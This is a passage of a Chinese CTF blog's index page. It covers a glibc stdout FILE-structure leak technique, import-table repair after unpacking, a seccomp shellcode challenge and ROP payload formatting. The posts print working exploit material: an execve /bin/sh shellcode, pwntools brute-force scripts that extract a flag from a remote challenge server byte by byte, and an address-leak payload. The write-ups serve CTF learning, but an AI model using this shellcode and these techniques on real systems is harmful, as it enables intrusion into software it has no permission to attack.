<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_overflow (FILE *f, <span class="keyword">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          _IO_doallocbuf (f);</span><br><span class="line">          _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">         If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">         logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">         read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">         makes room for subsequent output.</span></span><br><span class="line"><span class="comment">         Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">         alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">          _IO_free_backup_area (f);</span><br><span class="line">          f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">                                   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">          f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">        f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">        f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">                         f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">'\n'</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">                      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">char</span>) ch;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)</span><br></pre></td></tr></table></figure>
<p>而</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (ch == EOF)</span><br><span class="line">    return _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">                         f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br></pre></td></tr></table></figure>
<p>有可能被我们控制。</p>
<p>只需要满足：<code>(f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) != 0</code>就会进行这个判断,也就是<code>_IO_CURRENTLY_PUTTING为1</code>(stdout中本来就是1)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br></pre></td></tr></table></figure>
<p>考虑到<code>_IO_new_file_xsputn</code>中这条语句的影响，我们可以直接修改_IO_write_base的值</p>
<p>再看<code>_IO_do_write</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_do_write (FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, <span class="keyword">size_t</span> to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">          || (<span class="keyword">size_t</span>) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_do_write, _IO_do_write)</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">size_t</span></span><br><span class="line">new_do_write (FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, <span class="keyword">size_t</span> to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">size_t</span> count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">off64_t</span> new_pos</span><br><span class="line">        = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">                       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">                       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为了正常运行这个函数，不让他return 0.需要满足<code>_IO_IS_APPENDING=1</code></p>
<h4 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h4><p>泄露的实例如下，当我们可以控制stdout时，只需如下操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">new(0x60,p64(0xfbad1800) + p64(0)*3 + &quot;\x00&quot;)</span><br><span class="line">leak = r.recv(0x20)</span><br><span class="line">leak = leak[0x18:]</span><br><span class="line">leak_Addr = u64(leak[:6].ljust(8,&quot;\x00&quot;))-e.symbols[&quot;_IO_file_jumps&quot;]</span><br><span class="line">print hex(leak_Addr)</span><br></pre></td></tr></table></figure>
<p>另一个重点则在于如何劫持stdout结构体</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/08/04/输入表的替换/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/photo/hello.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/08/04/输入表的替换/" itemprop="url">输入表的替换</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-04T20:53:01+08:00">
                2019-08-04
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  118
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  1
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>遇到一个题目，正常的手动脱壳完成之后运行程序失败，出现这样的东西</p>
<p> <img src="/2019/08/04/输入表的替换/错误1.PNG" alt="错误1"></p>
<p>解决的方法是使用工具ImportREConstructor 1.7e</p>
<p>在IREC树形框里找到user32.dll 展开找到NtdllDefWindowProc_A</p>
<p>在弹出窗口的module中找到user32.dll 然后在下面的列表框中找到DefWindowProcA</p>
<p>在弹出窗口的module中找到user32.dll 然后在下面的列表框中找到DefWindowProcA<br>再修复就不会有这样的情况了</p>
<p> <img src="/2019/08/04/输入表的替换/修正1.PNG" alt="修正1"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/07/22/seccomp-flag-s爆破/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/photo/hello.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/07/22/seccomp-flag-s爆破/" itemprop="url">seccompmp_flag' ![buf](seccomp-flag-s爆破\buf.PNG)</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-22T13:58:48+08:00">
                2019-07-22
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  861
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  3
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>刚做完了一道题目，是一道shellcode题目，当然，有一定的保护 <img src="/2019/07/22/seccomp-flag-s爆破/buf.PNG" alt="buf"></p>
<p> <img src="/2019/07/22/seccomp-flag-s爆破/protect.PNG" alt="protect"></p>
<p>从以上两张照片可以看到这个题目中给的shellcode的限制</p>
<p>不能出现空字符</p>
<p>关闭了输入流，输出流，以及error</p>
<p>只允许使用read，write，exit，（还有一个我不知道是啥，好像是和信号处理有关）</p>
<h4 id="任意输入数据，gdb调试一波"><a href="#任意输入数据，gdb调试一波" class="headerlink" title="任意输入数据，gdb调试一波"></a>任意输入数据，gdb调试一波</h4><p>加上，开始调试</p>
<p> <img src="/2019/07/22/seccomp-flag-s爆破/bendiflag.PNG" alt="bendiflag"></p>
<p>发现有有用的其实也就上面的图，读取/flag文件之后把内容读取到了rdi，rdx寄存器中。so，我们的shellcode 好写一点了。</p>
<h4 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h4><p>长度&lt;=200</p>
<p>我最常用的无任何限制的shellcode的长度是0x18</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05</span><br></pre></td></tr></table></figure>
<p>即使是随便其他的shellcode，也比200小得多，所以这个限制没什么</p>
<h4 id="关闭了输入流，输出流，以及error。只允许使用read，write，exit，（还有一个我不知道是啥，好像是和信号处理有关）"><a href="#关闭了输入流，输出流，以及error。只允许使用read，write，exit，（还有一个我不知道是啥，好像是和信号处理有关）" class="headerlink" title="关闭了输入流，输出流，以及error。只允许使用read，write，exit，（还有一个我不知道是啥，好像是和信号处理有关）"></a>关闭了输入流，输出流，以及error。只允许使用read，write，exit，（还有一个我不知道是啥，好像是和信号处理有关）</h4><p>md，本来我是不知道close(0),close(1),close(2).所以我想的是既然开了write，还有rdi,rdx寄存器里存着，直接write读取不就完了。只要想着绕开空字符限制就好了。然而失败了。卡了好大阵子后。。终于发现read，close还是不能用。。。。我哭了</p>
<h4 id="无空字符限制"><a href="#无空字符限制" class="headerlink" title="无空字符限制"></a>无空字符限制</h4><p>本来解决这个限制的原因是使用write系统调用，虽然write调用没用，但是解决方法倒是找到了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rax,0x3c999999</span><br><span class="line">shr rax,24</span><br></pre></td></tr></table></figure>
<p>使用这种方法，很轻松的就可以讲想要的寄存器放入任意的数值，而且，不需要担心空字节问题，我tql</p>
<h4 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h4><p>最终，找到了方法，爆破，我只需要编写类似的语句就可以了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if flag[i] == flag_byte:</span><br><span class="line">	i++</span><br><span class="line">else:</span><br><span class="line">	flag_byte++</span><br></pre></td></tr></table></figure>
<p>emmm</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mov sil,byte ptr[rdx+&apos;&apos;&apos;+str(i)+&apos;&apos;&apos;]</span><br><span class="line">mov dil,&apos;&apos;&apos;+hex(flag_byte)+&apos;&apos;&apos;</span><br><span class="line">cmp sil,dil</span><br><span class="line">je right</span><br><span class="line">mov rax,0x11999999</span><br><span class="line">syscall</span><br><span class="line">right:</span><br><span class="line">mov rax,0x3c999999</span><br><span class="line">shr rax,24</span><br><span class="line">xor rdi,rdi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">xor rsi,rsi</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
<p>只需要让他在失败的时候调用无法无法运行的语句，成功的时候正常退出就好了。完美</p>
<h4 id="然而"><a href="#然而" class="headerlink" title="然而"></a>然而</h4><p>本地跑和远程居然不一样！</p>
<p>我本地得到的反馈是，如果正常退出</p>
<p>会有exit 0这样子的输出</p>
<p>我就用pwntools里的p.poll来判断</p>
<p>但是远程不行。。幸亏有反馈</p>
<p>so，本地脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> flag_byte <span class="keyword">in</span> xrange(<span class="number">105</span>,<span class="number">107</span>): </span><br><span class="line">	p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">	<span class="comment">#p = remote('pwn1.blue-whale.me',19910)</span></span><br><span class="line">	p.recvuntil(<span class="string">'vehicle\n'</span>)</span><br><span class="line">	<span class="comment">#the flag was stored in rdx and rdi</span></span><br><span class="line">	shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">	mov sil,byte ptr[rdx+'''</span>+str(i)+<span class="string">''']</span></span><br><span class="line"><span class="string">	mov dil,'''</span>+hex(flag_byte)+<span class="string">'''</span></span><br><span class="line"><span class="string">	cmp sil,dil</span></span><br><span class="line"><span class="string">	je right</span></span><br><span class="line"><span class="string">	mov rax,0x11999999</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	right:</span></span><br><span class="line"><span class="string">	mov rax,0x3c999999</span></span><br><span class="line"><span class="string">	shr rax,24</span></span><br><span class="line"><span class="string">	xor rdi,rdi</span></span><br><span class="line"><span class="string">	xor rdx,rdx</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	'''</span></span><br><span class="line">	)</span><br><span class="line">	p.sendline(shellcode)</span><br><span class="line">	<span class="keyword">if</span> p.poll()!=<span class="number">0</span>:</span><br><span class="line">	    p.close()</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">	    flag += chr(flag_byte)</span><br><span class="line">	    log.success(flag)</span><br></pre></td></tr></table></figure>
<p>远程脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="comment">#flag = "ctf&#123;1eak1ng_0n1y_One_biT_is_impor7anT_To_The_security_of_2"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> flag_byte <span class="keyword">in</span> xrange(<span class="number">32</span>,<span class="number">127</span>): </span><br><span class="line">	<span class="comment">#p = process('./pwn')</span></span><br><span class="line">	p = remote(<span class="string">'pwn2.blue-whale.me'</span>,<span class="number">19910</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'vehicle\n'</span>)</span><br><span class="line">	<span class="comment">#the flag was stored in rdx and rdi</span></span><br><span class="line">	shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">	mov sil,byte ptr[rdx+'''</span>+str(i)+<span class="string">''']</span></span><br><span class="line"><span class="string">	mov dil,'''</span>+hex(flag_byte)+<span class="string">'''</span></span><br><span class="line"><span class="string">	cmp sil,dil</span></span><br><span class="line"><span class="string">	je right</span></span><br><span class="line"><span class="string">	mov rax,0x11999999</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	right:</span></span><br><span class="line"><span class="string">	mov rax,0x3c999999</span></span><br><span class="line"><span class="string">	shr rax,24</span></span><br><span class="line"><span class="string">	xor rdi,rdi</span></span><br><span class="line"><span class="string">	xor rdx,rdx</span></span><br><span class="line"><span class="string">	xor rsi,rsi</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	'''</span></span><br><span class="line">	)</span><br><span class="line">	p.sendline(shellcode)</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		p.recv(timeout =<span class="number">0.5</span>)</span><br><span class="line">		p.close()</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		flag += chr(flag_byte)</span><br><span class="line">	    	log.success(flag)</span><br></pre></td></tr></table></figure>
<h4 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h4><p>在题目复现的时候会发现，seccomp的使用，使得直接进行gdb调试是可行的，但是使用pwntools进行attach调试会失败。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/07/17/rop书写的几种形式/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/photo/hello.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/07/17/rop书写的几种形式/" itemprop="url">rop书写的几种形式</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-17T12:15:45+08:00">
                2019-07-17
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  100
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  1
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p>64位的直接用p64</p>
<p>32的直接写p32</p>
<p>一个接一个，最基本的也是最常见的</p>
<h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>先确定环境例如</p>
<p>context.arch = ‘i386’</p>
<p>一种类似layout = [payload]</p>
<p>然后flat(layout)也就是省略了p32(payload)</p>
<h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>第三种方法就是</p>
<p>也是有一个rop = [payload]</p>
<p>然后使用这种方式</p>
<p>payload += ‘’.join(list(map(p64,rop)))</p>
<p>效果一样</p>
<p>主要还是看rop链本身的构造</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/07/07/计算机组成原理期末复习/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/photo/hello.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
